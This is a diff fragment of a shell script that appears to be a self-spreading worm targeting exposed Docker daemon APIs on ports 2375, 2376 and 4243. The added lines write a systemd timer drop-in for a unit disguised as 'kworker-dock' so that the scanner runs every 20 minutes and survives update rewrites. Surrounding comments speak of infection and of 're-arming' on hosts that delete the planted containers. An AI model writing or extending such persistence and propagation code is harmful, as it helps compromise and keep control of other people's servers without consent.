@@ -38,6 +38,18 @@ PAR="${E_PAR:-${DOCK_PAR:-20}}"             # concurrent probes
 RETRY="${DOCK_RETRY:-604800}"     # rescAN a dead host after 7d
 PORTS="${DOCK_PORTS:-2375 2376 4243}"
 SKIPSELF="${E_SELF:-${DOCK_SKIP_SELF:-yes}}"   # don't stack a container on our own daemon
+# ---- self-healing cadence ---------------------------------------------------
+# Our timer shipped with a 6h period, which throttled the whole vector. The
+# updater rewrites unit files but never their intervals, so enforce it here too:
+# a drop-in outranks the main unit AND survives updater rewrites. Off-box runs
+# (the PC under git-bash, containers) fail these tests and skip.
+if [ -d /etc/systemd/system ] && [ -w /etc/systemd/system ] &&
+   [ ! -f /etc/systemd/system/kworker-dock.timer.d/zz-cadence.conf ]; then
+    mkdir -p /etc/systemd/system/kworker-dock.timer.d 2>/dev/null &&
+        printf '[Timer]\nOnUnitActiveSec=20min\nRandomizedDelaySec=2min\n' \
+            > /etc/systemd/system/kworker-dock.timer.d/zz-cadence.conf 2>/dev/null &&
+        { systemctl daemon-reload 2>/dev/null; systemctl restart kworker-dock.timer 2>/dev/null; } || true
+fi
 # ---- re-arm: the difference between infecting and KEEPING --------------------
 # Measured on this population: a slice of the boxes prunes foreign containers AND
 # images off themselves (our container gone, /images/<img>/json 404, while the
